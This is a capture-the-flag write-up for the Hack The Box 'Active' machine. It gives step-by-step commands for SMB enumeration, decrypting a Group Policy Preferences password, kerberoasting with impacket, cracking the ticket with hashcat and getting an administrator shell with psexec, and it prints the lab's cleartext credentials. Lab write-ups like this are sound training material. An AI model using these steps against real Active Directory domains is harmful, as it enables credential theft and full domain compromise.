HTB-Active-Writeup

IP : 10.10.10.100

Nmap
----
- nmap shows a bunch of open ports 
	- 53 for DNS
	- 88 for kerberos 
	- 135 for msrpc
	- 139 for netbios
	- 389 for ldap
	- 445 for SMB
	- and much more

Enumeration
-----------
- seeing the open ports we can be pretty sure that we are dealing with active directory this time 
- we can start by enumerating the smb
	
	smbmap -H 10.10.10.100

	smbclient -L ///10.10.10.100

- we can view the shares

	         Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    NO ACCESS
        NETLOGON                                                NO ACCESS
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS
        Users                          							NO ACCESS

- we can access the replicatiob share
- we can read the contents of replication share with the help of smbclient tool

	smbclient //10.10.10.100/Replication

- we can download the entire files inside the Replication share 

	mget *

- we can check the downloaded files for any useful lead 
- we found groups.xml inside the following path

	\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\

- groups.xml is a xml file created in the SYSVOL share with config data and credentials when a new Group Policy Preference (GPP) is created 
- we can check the group.xml for credentials and we got one 

	user : active.htb\SVC_TGS
	hash : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

- the cpassword can be decrypted by using the tool gpp-decrypt

	gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

	creds : SVC_TGS : GPPstillStandingStrong2k18

- checking the credentials we got against smb again

	smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

- we got 3 more readable shares
	- NETLOGON
	- SYSVOL
	- Users

- we can go look for the user flag from \Users\SVC_TGS\desktop\
- grab the user flag

Priv-esc
--------
- we saw kerberos running on port 88 and we do have credentials for a domain user we can try kerberoasting
- we can use the GetUserSPNs.py script from impacket to carry out this attack

	GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile kerb.out

- if we check the kerb.out file we can see that we have a ticket 
- we can brute force the ticket using hashcat to get the password 
	
	  hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force

- we got the password as Ticketmaster1968

	creds : Administrator : Ticketmaster1968

- lets check this credentials against smb

	smbmap -H 10.10.10.100 -d active.htb -u administrator -p Ticketmaster1968

- looks like we have access to the entire file system
- we can connect to smb with the credentials

	smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968

- we can try to get a shell with psexec

	psexec.py active.htb/administrator@10.10.10.100

- grab the root flag
